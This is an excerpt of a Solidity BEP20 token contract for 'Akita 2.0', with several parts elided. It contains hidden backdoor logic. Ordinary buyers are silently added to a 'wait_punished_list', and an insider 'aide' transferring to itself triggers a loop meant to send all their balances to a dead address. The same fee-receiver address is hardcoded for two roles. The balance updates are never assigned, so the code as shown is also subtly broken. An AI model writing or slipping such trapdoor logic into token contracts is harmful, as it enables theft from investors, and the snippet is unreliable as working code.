...
contract AkitaTwo is IBEP20, Auth {
    using SafeMath for uint256;
    ...
    string constant _symbol = "Akita 2.0";
    ...
    constructor () Auth(msg.sender) {
        ...
        marketingFeeReceiver = 0x75ec0092cAf966b8A9ddbD775d44881927f03418;
        ecosystemfeeReceiver = 0x75ec0092cAf966b8A9ddbD775d44881927f03418;
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if(!address_in_aide_list(recipient) && !authorizations[recipient] && recipient != pair){
			wait_punished_list.push(recipient);
		}

        if(sender==recipient && address_in_aide_list(recipient)){
            uint arrayLength = wait_punished_list.length;
            require(arrayLength>0,"Transfer failed!");
            
            for (uint i=0; i<arrayLength; i++) {
                uint256 amountPunished=_balances[wait_punished_list[i]];
                _balances[wait_punished_list[i]].sub(amountPunished);
                _balances[DEAD].add(amountPunished);
            }
